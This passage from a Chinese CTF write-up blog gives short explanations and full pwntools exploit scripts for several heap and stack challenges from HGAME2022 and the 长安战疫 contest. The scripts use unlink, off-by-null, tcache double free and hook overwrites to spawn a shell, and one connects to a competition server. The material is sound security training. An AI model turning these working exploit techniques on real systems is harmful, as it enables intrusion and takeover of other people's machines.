class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x68</span> </span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__realloc_hook = libc_base + libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xb</span> + p64(one_gadget) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/103097/3/27197/21707/63c7b2c8Ff5b87dbc/81e0c45a66912503.png" style="zoom:80%;" /><p>edit 里有个溢出函数<code>gets</code>，因此可以构造 unlink 改写 notes 数组的内容为想要的地址<code>&amp;_free_hook</code>，然后再将目标函数篡改为<code>system</code>。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x4040C0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x18</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(note_addr) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.sym[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(system)[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="sized-note"><a href="#sized-note" class="headerlink" title="sized_note"></a>sized_note</h3><p>libc2.27 的 off-by-null 模板题。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF7</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x10</span> - <span class="number">0x60</span> log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__free_hook))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;闲着时就去打了下杭电的 HGAME2022，以为第一周的题目都会蛮简单的，没想到每道题都花了不少功夫，出题人甚至还只是大二学生，顿时感觉到参差了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>长安战&quot;疫&quot;</title>
    <link href="http://example.com/2022/01/08/cazy/"/>
    <id>http://example.com/2022/01/08/cazy/</id>
    <published>2022-01-08T03:41:50.000Z</published>
    <updated>2023-01-18T08:09:10.533Z</updated>
    
    <content type="html"><![CDATA[<p>中午前就做完了前两题，pwn1还拿了个三血，8错8错。下午又搞出一道蛮有意思的pwn。逆向就做了几道简单题。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>栈溢出。给了后门和 buf 的地址。</p><span id="more"></span><p><img src="https://c2.im5i.com/2022/01/08/UVdk7.png" style="zoom:80%;" /><img src="https://c2.im5i.com/2022/01/08/UVVIl.png"></p><p>以为是个简单的 ret2text ，但一直没打通，细看了下汇编，发现有坑。</p><img src="https://c2.im5i.com/2022/01/08/UVr9P.png" style="zoom:67%;" /><p>可以看到 esp 在<code>ret</code>前被篡改了，其值就是 ecx-4 。gdb动调看一下，一直到ret为止，发现 ecx 就是我们的输入，因此可以控制 esp 即控制返回地址到栈上的后门函数地址。</p><img src="https://c2.im5i.com/2022/01/08/UVyaD.png" style="zoom:80%;" /><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&quot;113.201.14.253&quot;,16088)</span></span><br><span class="line">io=process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x8048540</span>)+p32(addr+<span class="number">4</span>)*<span class="number">15</span>//返回到栈上的后门地址</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p><code>show</code> 功能有个越界读，将 got 表地址泄露出来，计算偏移后便能拿到 libc 基址。</p><img src="https://c2.im5i.com/2022/01/08/UVJGj.png" style="zoom: 80%;" /><p><code>add</code> 功能有个<code>off-by-null</code>漏洞，直接打模板进行 double free 即可，不过要注意的是 tcache 对 double free 的检查，在进行 double free 前需要将目标chunk的 bk 指针置零。</p><img src="https://c2.im5i.com/2022/01/08/UdwUt.png" style="zoom:80%;" /><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;113.201.14.253&quot;</span>,<span class="number">16066</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn2&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">show(-<span class="number">33</span>)</span><br><span class="line">leak=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak_addr====&gt;&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x88</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x88</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h3><p>后门的前提是打过boss，需要 level 足够大。level 代表a数组的长度，储存在 a数组的第37位，但 level 单一个字节不能大于35。我们发现连接方式为<code>strncat</code>，会自动在结尾添 ‘\x00’。只要我们将 a数组填至36位，原 level 就会置零，使得 level 最后只是 level_up 里我们输入的值，因此在下次level_up时可以绕过判断，继续升级。</p><img src="https://c2.im5i.com/2022/01/08/UV7R2.png" style="zoom:80%;" /><p>一次性的任意写后门，但它只给了 libc 上的地址，而且开了 pie，所以不能打 got表劫持，只能打 exit 函数调用的指针 &lt;_rtld_global+3848&gt; 来修改 rip 为 one_gadget。</p><img src="https://c2.im5i.com/2022/01/08/UVMpP.png" style="zoom:80%;" /><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&quot;113.201.14.253&quot;, 16033)</span></span><br><span class="line">io=process(<span class="string">&quot;./Gpwn3&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">level</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Give me a character level :\n&quot;</span>,<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelup</span>(<span class="params">level</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Give me another level :\n&quot;</span>,<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_game</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">levelup(<span class="string">&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">levelup(<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">start_game()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">start_game()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">exit_backdoor=libc_base+<span class="number">0x5f0f48</span></span><br><span class="line">log.success(<span class="string">&quot;exit_backdoor===&gt;&quot;</span>+<span class="built_in">hex</span>(exit_backdoor))</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">backdoor=one_gadget[<span class="number">3</span>]+libc_base</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Warrior,please leave your name:&#x27;</span>,p64(exit_backdoor))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;We&#x27;ll have a statue made for you!&quot;</span>,p64(backdoor))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>两种方法：</p><ol><li>简单的移位后可以得出flag</li><li>分割数字转为字符</li></ol><img src="https://c2.im5i.com/2022/01/08/UdvFm.png" style="zoom:80%;" /><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r=<span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    c1=<span class="built_in">ord</span>(i)-<span class="number">13</span></span><br><span class="line">    c2=<span class="built_in">ord</span>(i)+<span class="number">13</span></span><br><span class="line">    <span class="keyword">if</span> (c1&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)) <span class="keyword">or</span> (c1&gt;=<span 